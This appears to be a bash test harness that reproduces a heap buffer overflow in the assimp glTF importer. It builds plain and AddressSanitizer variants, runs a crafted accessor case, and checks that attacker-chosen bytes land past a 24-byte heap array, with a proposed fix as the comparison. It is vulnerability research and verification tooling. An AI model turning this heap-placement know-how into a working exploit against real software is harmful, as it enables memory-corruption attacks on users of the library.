#!/usr/bin/env bash
# Real-path heap placement probe for CVE-2026-134861. The crafted count=2
# VEC4 POSITION accessor makes ExtractData copy 16 bytes into each 12-byte
# aiVector3D; the final element's chosen 4th component ("TAUF") lands 4 bytes
# past the 24-byte array. Two observations are recorded:
#   * plain glibc build: the importer aborts in free() on the damaged chunk;
#   * ASan build: the report pins the write, and a report callback records
#     the fault address, unpoisons only that redzone with halt_on_error=0 so
#     the importer's own memcpy completes, then dumps the live bytes.
# The callback changes instrumentation only, never the library or input.
# The PR6860 hunk is a proposed unmerged fix, not a released fixed version.
set -euo pipefail
cd "$(dirname "$0")/.."

bash bootstrap.sh >/dev/null
mkdir -p placement/evidence harness/bin
rm -f placement/evidence/*.out
log=placement/evidence/placement.log
: >"$log"
pass=0
fail=0
check() { # name, logfile, fixed substring to require, fixed substring to reject
    local name="$1" file="$2" need="${3-}" reject="${4-}"
    if [ -n "$need" ] && ! grep -qF "$need" "$file"; then
        printf 'FAIL %s (missing: %s)\n' "$name" "$need" | tee -a "$log"; fail=$((fail+1)); return
    fi
    if [ -n "$reject" ] && grep -qF "$reject" "$file"; then
        printf 'FAIL %s (found: %s)\n' "$name" "$reject" | tee -a "$log"; fail=$((fail+1)); return
    fi
    printf 'PASS %s\n' "$name" | tee -a "$log"; pass=$((pass+1))
}

src=pins/assimp-6.0.6
bld=build-min-plain
cmake -G Ninja -S "$src" -B "$bld" \
    -DCMAKE_BUILD_TYPE=Release \
    -DCMAKE_C_FLAGS='-O1 -g0' \
    -DCMAKE_CXX_FLAGS='-O1 -g0' \
    -DASSIMP_BUILD_ALL_IMPORTERS_BY_DEFAULT=OFF \
    -DASSIMP_BUILD_GLTF_IMPORTER=ON \
    -DASSIMP_BUILD_ALL_EXPORTERS_BY_DEFAULT=OFF \
    -DASSIMP_BUILD_ASSIMP_TOOLS=OFF \
    -DASSIMP_BUILD_TESTS=OFF \
    -DASSIMP_BUILD_SAMPLES=OFF \
    -DASSIMP_BUILD_ZLIB=ON \
    -DASSIMP_WARNINGS_AS_ERRORS=OFF >/dev/null
cmake --build "$bld" --parallel 2 --target assimp >/dev/null
g++ -O1 -g0 -DPLAIN_READ \
    -I "$src/include" -I "$bld/include" \
    harness/placement_driver.cpp -L "$bld/bin" -lassimp \
    -Wl,-rpath,"$PWD/$bld/bin" -o harness/bin/placement_plain

# The already-built minimal ASan libraries and drivers come from
# harness/run-realpath.sh; do not rebuild them here.
for lib in build-min build-min-fixed; do
    [ -f "$lib/bin/libassimp.so.6.0.6" ] || {
        printf 'FAIL missing %s (run harness/run-realpath.sh first)\n' "$lib" | tee -a "$log"
        exit 1
    }
done
for pair in vuln:build-min fixed:build-min-fixed; do
    label=${pair%%:*}
    lib=${pair##*:}
    g++ -O1 -g0 -fsanitize=address -fno-omit-frame-pointer \
        -I "$src/include" -I "$lib/include" \
        harness/asan_report_driver.cpp -L "$lib/bin" -lassimp \
        -Wl,-rpath,"$PWD/$lib/bin" -o "harness/bin/asan_report_$label"
done

run() { # driver, case, output
    local drv="$1" c="$2" out="$3" rc
    ASAN_OPTIONS=detect_leaks=0:abort_on_error=0:halt_on_error=0:symbolize=1 \
        "$drv" "harness/cases/$c.gltf" >"$out" 2>&1 || rc=$?
    rc=${rc:-0}
    printf '# %s case=%s rc=%s\n' "$(basename "$drv")" "$c" "$rc" >>"$log"
}

run harness/bin/placement_plain vec4pos-count2 placement/evidence/plain-vuln.out
run harness/bin/placement_plain safe placement/evidence/plain-safe.out
run harness/bin/asan_report_vuln vec4pos-count2 placement/evidence/asan-vuln.out
run harness/bin/asan_report_vuln safe placement/evidence/asan-safe.out
run harness/bin/asan_report_fixed vec4pos-count2 placement/evidence/asan-fixed.out

check plain-vuln-glibc-abort placement/evidence/plain-vuln.out 'malloc(): invalid size (unsorted)'
check plain-safe-clean placement/evidence/plain-safe.out 'scene=ok' 'malloc(): invalid size'
check asan-vuln-oob-class placement/evidence/asan-vuln.out 'heap-buffer-overflow'
check asan-vuln-oob-write placement/evidence/asan-vuln.out 'WRITE of size 16'
check asan-vuln-oob-region placement/evidence/asan-vuln.out '0 bytes after 24-byte region'
check asan-vuln-frame placement/evidence/asan-vuln.out 'glTF::Accessor::ExtractData'
check asan-vuln-chosen-bytes placement/evidence/asan-vuln.out 'at16=54415546'
check asan-vuln-import-completed placement/evidence/asan-vuln.out 'scene=ok'
check asan-fixed-no-report placement/evidence/asan-fixed.out '' 'ERROR: AddressSanitizer'
check asan-safe-no-report placement/evidence/asan-safe.out 'case=' 'ERROR: AddressSanitizer'
check asan-safe-no-postwrite placement/evidence/asan-safe.out '' 'POST_WRITE'

printf 'RESULT %s PASS / %s FAIL\n' "$pass" "$fail" | tee -a "$log"
sha256sum placement/evidence/*.out | tee -a "$log"
[ "$fail" -eq 0 ]
